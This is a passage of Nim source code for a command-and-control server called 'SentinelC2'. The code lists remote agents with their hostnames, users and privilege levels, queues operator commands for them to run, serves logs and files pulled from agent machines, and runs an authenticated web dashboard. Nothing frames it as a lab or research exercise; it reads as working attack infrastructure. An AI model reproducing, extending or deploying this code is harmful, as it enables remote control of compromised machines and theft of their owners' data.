  # Snapshot the agent list under the lock, then build the JSON outside
  type Snap = tuple[id, host, user, os, priv: string, beat: DateTime]
  var snap: seq[Snap] = @[]
  {.cast(gcsafe).}:
    withLock agentsLock:
      for id, a in agents.pairs:
        snap.add((id, a.hostname, a.username, a.osInfo, a.privileges, a.lastBeacon))
  var arr = newJArray()
  let nowTime = now()
  for s in snap:
    let secs = (nowTime - s.beat).inSeconds
    let uptime = intToStr(secs div 3600, 2) & ":" &
                 intToStr((secs mod 3600) div 60, 2) & ":" &
                 intToStr(secs mod 60, 2)
    arr.add(%* {
      "id": s.id,
      "hostname": s.host,
      "username": s.user,
      "os": s.os,
      "privileges": s.priv,
      "uptime": uptime,
      "lastBeacon": $s.beat
    })
  let body = $ %* {"agents": arr, "uptime_s": (nowTime - bootTime).inSeconds}
  await jsonResp(req, Http200, body)

proc getQueryInt(query: string, key: string, default = 0): int =
  # Simple query string parser: extracts "key=N" pairs
  for part in query.split('&'):
    let kv = part.split('=', 1)
    if kv.len == 2 and kv[0] == key:
      try: return parseInt(kv[1])
      except: discard
  return default

proc apiLog(req: Request, agentId: string) {.async, gcsafe.} =
  let path = LOGS_DIR / (agentId & ".log")
  if not fileExists(path):
    await jsonResp(req, Http200, $ %* {"text": "", "total_size": 0})
    return
  let since = getQueryInt(req.url.query, "since", 0)
  let data = readFile(path)
  let total = data.len
  let text = (if since < total: data[since..<total] else: "")
  await jsonResp(req, Http200, $ %* {"text": text, "total_size": total})

proc apiFiles(req: Request, agentId: string) {.async, gcsafe.} =
  let dir = DOWNLOADS_DIR / agentId
  if not dirExists(dir):
    await jsonResp(req, Http200, $ %* {"files": []})
    return
  var files: seq[JsonNode] = @[]
  for f in walkFiles(dir / "*"):
    files.add(%* {"name": f.extractFilename, "size": getFileSize(f)})
  await jsonResp(req, Http200, $ %* {"files": files})

proc apiCmd(req: Request) {.async, gcsafe.} =
  try:
    let body = parseJson(req.body)
    let aid = body["id"].getStr("")
    let cmd = body["cmd"].getStr("")
    let args = body["args"].getStr("")
    var found = false
    {.cast(gcsafe).}:
      withLock agentsLock:
        if aid in agents:
          let cm = buildCmd(cmd, args)
          agents[aid].cmdQueue.add(cm)
          found = true
    if found:
      await jsonResp(req, Http200, $ %* {"ok": true, "id": aid, "cmd": cmd, "args": args})
    else:
      await jsonResp(req, Http200, $ %* {"ok": false, "error": "not found"})
  except:
    serverLog("apiCmd exception: " & getCurrentExceptionMsg())
    await jsonResp(req, Http400, $ %* {"ok": false, "error": getCurrentExceptionMsg()})

proc checkAuth(req: Request): bool =
  # Validate Basic auth on every request. The web dashboard is
  # operator-only; without this, anyone on the network (Tailscale,
  # LAN, or anycast via Tailscale Funnel) can control the C2.
  let auth = req.headers.getOrDefault("Authorization")
  if not auth.startsWith("Basic "): return false
  let cred = auth[6..^1]
  let dec = base64.decode(cred)
  let parts = dec.split(':', 1)
  if parts.len != 2: return false
  return parts[0] == WEB_AUTH_USER and parts[1] == WEB_AUTH_PASSWORD

proc requireAuth(req: Request) {.async, gcsafe.} =
  await req.respond(Http401, "unauthorized",
                    newHttpHeaders({"WWW-Authenticate": "Basic realm=\"SentinelC2\"",
                                    "Content-Type": "text/plain"}))

proc webHandler(req: Request) {.async, gcsafe.} =
  # All endpoints (incl. /) require auth. The HTML page itself is
  # served only after auth — the browser will prompt for credentials
  # on first load.
  if not checkAuth(req):
    await requireAuth(req); return
  let url = req.url.path
  let m = req.reqMethod
  if m == HttpGet and url == "/":
    await req.respond(Http200, DASHBOARD_HTML,
                      newHttpHeaders({"Content-Type": "text/html; charset=utf-8"}))
    return
  if m == HttpGet and url == "/api/agents":
    await apiAgents(req); return
  if m == HttpGet and url.startsWith("/api/log/"):
    await apiLog(req, url[9..^1]); return
  if m == HttpGet and url.startsWith("/api/files/"):
    await apiFiles(req, url[11..^1]); return
  if m == HttpPost and url == "/api/cmd":
    await apiCmd(req); return
  if m == HttpGet and url.startsWith("/downloads/"):
    # /downloads/<id>/<file>
    let rest = url[11..^1]
    let slash = rest.find('/')
    if slash < 0:
      await req.respond(Http400, "bad path"); return
    let aid = rest[0..<slash]
    let fname = rest[slash+1..^1]
    if fname.contains("..") or fname.contains('\\') or fname.contains('/'):
      await req.respond(Http400, "bad filename"); return
    let fpath = DOWNLOADS_DIR / aid / fname
    await sendWebFile(req, fpath, "application/octet-stream")
    return
  await req.respond(Http404, "not found")

# ------------------------------------------------------------
# MAIN
# ------------------------------------------------------------
proc main() {.async.} =
  randomize()
  initLock(agentsLock)
  createDir(LOGS_DIR)
  createDir(DOWNLOADS_DIR)
  createDir(UPLOADS_DIR)
  cliCh.open()
  var t: Thread[void]
  createThread(t, cliThread)
  asyncCheck processCli()

  let srv = newAsyncSocket()
  srv.setSockOpt(OptReuseAddr, true)
  srv.bindAddr(Port(LISTEN_PORT), LISTEN_HOST)
  srv.listen()
  echo "[" & BuildPrefix & " *] SentinelC2 listening on ws://",
       LISTEN_HOST, ":", LISTEN_PORT
  echo "[" & BuildPrefix & " *] type 'help' for commands"

  # Web dashboard
  bootTime = now()
  let webSrv = newAsyncHttpServer()
  let webCb = proc(req: Request): Future[void] {.async, closure, gcsafe.} =
    try:
      await webHandler(req)
    except:
      serverLog("web handler exception: " & getCurrentExceptionMsg() &
                " url=" & $req.url.path)
  asyncCheck webSrv.serve(Port(WEB_PORT), webCb, WEB_HOST)
  echo "[" & BuildPrefix & " *] Web dashboard on http://", WEB_HOST, ":", WEB_PORT, "/"

  while true:
    asyncCheck handleAgent(await srv.accept())

when isMainModule:
  asyncCheck main()
  runForever()
